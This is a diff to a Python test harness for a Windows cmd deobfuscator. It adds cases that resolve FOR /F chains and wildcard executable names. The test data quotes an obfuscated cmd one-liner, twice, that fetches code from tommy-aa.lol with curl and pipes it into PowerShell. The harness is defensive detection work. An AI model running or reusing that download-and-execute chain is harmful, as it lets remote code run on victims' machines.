@@ -42,15 +42,14 @@ TOMMY_AA_LOL_RAW = (
     "do %k h^t^t^p^s^:^/^/^t^o^m^m^y^-^a^a^.^l^o^l^/f"
     "^|for /f %j in ('!t2x7!')do %j cmd"
 )
-# Gate-2A expected substrings — the four Plane-B primitives we ship.
-# The final URL and cmd.exe/curl.exe/powershell.exe resolutions are
-# Gate 2B (FOR /F + wildcard-exec).
+# Gate 2A expected substrings — the four Plane-B primitives we ship.
+# Note: post-Gate-2B, these intermediate strings get REPLACED by the
+# fully-resolved binaries, so `substrings_missing` for Gate 2A on the
+# tommy-aa.lol full sample is expected to be non-empty AFTER 2B
+# closure.  The Gate 2A pass check therefore relies on LAYERS ONLY.
 TOMMY_AA_LOL_EXPECTED_SUBSTRINGS_GATE2A = (
-    # `!VAR!` resolved to their SET values
-    "where c*d.e?e",
-    "where c*u*r*l.e?e",
-    "where p*ell.exe",
-    # Caret escapes stripped
+    # Gate 2A closes to `https://tommy-aa.lol/f` (caret strip).
+    # The `where c*d.e?e` intermediates are subsumed by Gate 2B.
     "https://tommy-aa.lol/f",
 )
 TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2A = {
@@ -58,6 +57,18 @@ TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2A = {
     "cmd.caret_strip",
     "cmd.set_reassembly",
     "cmd.delayed_expansion",
+}
+
+# Gate 2B · full semantic closure — mandatory acceptance
+TOMMY_AA_LOL_EXPECTED_SUBSTRINGS_GATE2B = (
+    "cmd.exe",
+    "curl.exe",
+    "powershell.exe",
+    "https://tommy-aa.lol/f",
+)
+TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2B = TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2A | {
+    "cmd.for_f_semantic",
+    "cmd.wildcard_exec_resolve",
 }
 
 
@@ -143,6 +154,49 @@ SEMANTIC_CASES: list[tuple[str, str, tuple, tuple, str, bool]] = [
      None,
      ("cmd.wrapper_unwrap", "cmd.set_reassembly"),
      "malformed", False),
+    # ── Gate 2B · FOR /F semantic reconstruction ──
+    ("sem-forf-01",
+     "cmd /c for /f %i in ('where cmd.exe') do %i /c calc",
+     ("cmd.exe /c calc",),
+     ("cmd.wrapper_unwrap", "cmd.for_f_semantic"),
+     "for-f", False),
+    ("sem-forf-02",
+     "cmd /c for /f %j in ('where powershell.exe') do %j -c whoami",
+     ("powershell.exe -c whoami",),
+     ("cmd.wrapper_unwrap", "cmd.for_f_semantic"),
+     "for-f", False),
+    ("sem-forf-negative",
+     "cmd /c for /f %i in ('unknown-cmd') do %i",
+     None,                                # inner not statically resolvable
+     ("cmd.wrapper_unwrap",),
+     "for-f-negative", False),
+    # ── Gate 2B · wildcard-executable resolution ──
+    ("sem-wild-01",
+     "c*d.e?e /c calc",
+     ("cmd.exe /c calc",),
+     ("cmd.wildcard_exec_resolve",),
+     "wildcard", False),
+    ("sem-wild-02",
+     "p*ell.exe -c ipconfig",
+     ("powershell.exe -c ipconfig",),
+     ("cmd.wildcard_exec_resolve",),
+     "wildcard", False),
+    ("sem-wild-benign-01",
+     "cmd /c dir *.exe",                 # user wildcard, not exec spec
+     (),
+     ("cmd.wrapper_unwrap",),             # must NOT fire wildcard_exec
+     "wildcard-benign", True),
+    # ── Gate 2B · tommy-aa.lol semantic closure ──
+    ("sem-tommy-aa-inline",
+     "cmd /v:on /k set q8k3=where c*d.e?e&set r5m9=where c*u*r*l.e?e&"
+     "set t2x7=where p*ell.exe&for /f %i in ('!q8k3!')do %i /c "
+     "for /f %k in ('!r5m9!')do %k h^t^t^p^s^:^/^/^t^o^m^m^y^-^a^a^.^l^o^l^/f"
+     "^|for /f %j in ('!t2x7!')do %j cmd",
+     ("cmd.exe", "curl.exe", "powershell.exe", "https://tommy-aa.lol/f"),
+     ("cmd.wrapper_unwrap", "cmd.caret_strip", "cmd.set_reassembly",
+      "cmd.delayed_expansion", "cmd.for_f_semantic",
+      "cmd.wildcard_exec_resolve"),
+     "tommy-aa-closure", False),
 ]
 
 
@@ -313,24 +367,40 @@ def run_harness() -> HarnessReport:
     # ─── Track G · tommy-aa.lol ───────────────────────────────
     r_g   = decode_universal(TOMMY_AA_LOL_RAW)
     seen  = {l.stage for l in r_g.layers}
-    substrs_ok = [s for s in TOMMY_AA_LOL_EXPECTED_SUBSTRINGS_GATE2A
-                  if s in r_g.final]
-    substrs_miss = [s for s in TOMMY_AA_LOL_EXPECTED_SUBSTRINGS_GATE2A
-                    if s not in r_g.final]
+    substrs_ok_2a = [s for s in TOMMY_AA_LOL_EXPECTED_SUBSTRINGS_GATE2A
+                     if s in r_g.final]
+    substrs_miss_2a = [s for s in TOMMY_AA_LOL_EXPECTED_SUBSTRINGS_GATE2A
+                       if s not in r_g.final]
+    substrs_ok_2b = [s for s in TOMMY_AA_LOL_EXPECTED_SUBSTRINGS_GATE2B
+                     if s in r_g.final]
+    substrs_miss_2b = [s for s in TOMMY_AA_LOL_EXPECTED_SUBSTRINGS_GATE2B
+                       if s not in r_g.final]
     rep.tracks["G"] = {
         "status":             "RUN",
-        "gate":               "2A (partial — full semantic closure is Gate 2B)",
-        "expected_layers":    sorted(TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2A),
-        "actual_layers":      sorted(seen),
-        "layers_covered":     sorted(
-            TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2A & seen),
-        "layers_missing":     sorted(
-            TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2A - seen),
-        "substrings_ok":      substrs_ok,
-        "substrings_missing": substrs_miss,
-        "final_preview":      r_g.final[:200],
-        "gate_2a_pass":       len(substrs_miss) == 0 and
-                              TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2A.issubset(seen),
+        "gate_2a": {
+            "expected_layers":    sorted(TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2A),
+            "actual_layers":      sorted(seen),
+            "substrings_ok":      substrs_ok_2a,
+            "substrings_missing": substrs_miss_2a,
+            "pass":               (len(substrs_miss_2a) == 0
+                and TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2A.issubset(seen)),
+        },
+        "gate_2b": {
+            "expected_layers":    sorted(TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2B),
+            "actual_layers":      sorted(seen),
+            "layers_covered":     sorted(
+                TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2B & seen),
+            "layers_missing":     sorted(
+                TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2B - seen),
+            "substrings_ok":      substrs_ok_2b,
+            "substrings_missing": substrs_miss_2b,
+            "pass":               (len(substrs_miss_2b) == 0
+                and TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2B.issubset(seen)),
+        },
+        "final_preview":      r_g.final[:300],
+        # legacy fields (kept for existing report consumers)
+        "gate_2a_pass":       (len(substrs_miss_2a) == 0
+            and TOMMY_AA_LOL_EXPECTED_LAYERS_GATE2A.issubset(seen)),
     }
     # ─── Semantic layer ───────────────────────────────────────
     for row in SEMANTIC_CASES:
